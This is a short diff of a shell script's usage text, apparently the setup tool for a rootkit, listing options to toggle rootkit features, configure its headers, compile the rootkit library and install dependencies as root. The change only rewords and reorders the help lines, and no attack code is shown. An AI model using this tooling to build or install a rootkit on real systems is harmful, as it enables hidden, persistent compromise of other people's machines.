@@ -128,13 +128,13 @@ setup_home(){
 
 USE_DIALOG=0
 HELPMSG="
-  Usage: $0 [option]
+  Usage: $0 [option(s)]
       Options:
           -h: Show this help message & exit.
-          -u: Enable use of 'dialog' throughout setup.
           -e: Do an environment check.
+          -u: Enable use of 'dialog' throughout setup.
           -t: Go through & switch rootkit toggles.
-          -C: Clean up installation/compilation mess & exit.
+          -C: Clean up installation/compilation mess.
           -d: Configure rootkit headers & settings.
           -c: Compile rootkit library in current directory & exit.
           -D: Install all potential required dependencies. (REQUIRES ROOT)
